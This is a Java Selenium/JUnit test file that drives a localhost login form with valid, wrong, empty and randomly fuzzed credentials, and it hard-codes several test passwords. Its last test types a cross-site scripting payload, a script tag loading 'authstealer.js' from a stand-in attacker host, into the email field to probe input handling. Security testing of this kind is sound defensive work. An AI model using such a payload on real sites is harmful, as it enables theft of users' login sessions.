import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.edge.EdgeDriver;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.util.Random;

public class TestLogin {

    public static WebDriver driver;
    public static WebDriverWait wait;

    protected String getSaltString() {
        String SALTCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < 10) { // length of the random string.
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;

    }

    @Before
    public void setup() throws InterruptedException{
        // Optional. If not specified, WebDriver searches the PATH for chromedriver.
        System.setProperty("webdriver.edge.driver", "C:\\msedgedriver.exe");
        driver = new EdgeDriver();
        driver.get("http://localhost:3000/");

        Thread.sleep(2500);
    }

    @Test
    public void testLoginAsAuditor() throws InterruptedException{

        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
        email.sendKeys("sgh@auditor.com");
        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
        password.sendKeys("sgh2021");

        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
        Thread.sleep(1000);

        loginButton.click();

        Thread.sleep(2000);
    }

    @Test
    public void testLoginAsAuditorWrongPassword() throws InterruptedException{

        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
        email.sendKeys("cgh@auditor.com");
        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
        password.sendKeys("wrongpassword");

        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
        Thread.sleep(1000);

        loginButton.click();

        Thread.sleep(4000);

//        WebElement errorMessage = driver.findElement(By.xpath("///*[@id=\"root\"]/form/div[2]/div[4]/ul/div/div/div[1]"));
        ////*[@id="root"]/form/div[2]/div[4]/ul/div/div/div[1]
        ///html/body/div/form/div[2]/div[4]/ul/div/div/div[1]

//        System.out.println(errorMessage.toString());


//        assert(errorMessage.getText() == "Wrong credentials");
    }

    @Test
    public void testLoginAsAuditorWrongEmail() throws InterruptedException{

        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
        email.sendKeys("cgh@audi123tor.com");
        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
        password.sendKeys("cgh2021");

        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
        Thread.sleep(1000);

        loginButton.click();

        Thread.sleep(4000);
    }

    @Test
    public void testLoginAsAuditorNeverFillPassword() throws InterruptedException{

        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
        email.sendKeys("cgh@audi123tor.com");
//        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
//        password.sendKeys("cgh2021");

        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
        Thread.sleep(1000);

        loginButton.click();

        Thread.sleep(4000);
    }

    @Test
    public void testLoginAsTenant() throws InterruptedException{
        WebElement loginAsButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[1]/div/label[1]/span[2]")));
        loginAsButton.click();
        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
        email.sendKeys("cghNoelGifts@tenant.com");
        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
        password.sendKeys("noelgifts2021");

        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
        loginButton.click();
        Thread.sleep(2000);
    }

    @Test
    public void testLoginFuzzerEmail() throws InterruptedException{
        WebElement loginAsButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[1]/div/label[1]/span[2]")));
        loginAsButton.click();
        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
        email.sendKeys(getSaltString()+"@tenant.com");
        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
        password.sendKeys("noelgifts2021");

        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
        loginButton.click();
        Thread.sleep(2000);
    }

    @Test
    public void testLoginFuzzerEmailAndPassword() throws InterruptedException{
        WebElement loginAsButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[1]/div/label[1]/span[2]")));
        loginAsButton.click();
        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
        email.sendKeys(getSaltString()+"@tenant.com");
        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
        password.sendKeys(getSaltString());

        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
        loginButton.click();
        Thread.sleep(2000);
    }

    @Test
    public void testLoginXSS() throws InterruptedException{
        WebElement loginAsButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[1]/div/label[1]/span[2]")));
        loginAsButton.click();
        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
        email.sendKeys("<script src=”http://hackersite.com/authstealer.js”> </script>");
        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
        password.sendKeys(getSaltString());

        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
        loginButton.click();
        Thread.sleep(2000);
    }

    @After
    public void quit() throws InterruptedException{
        driver.quit();
    }
}


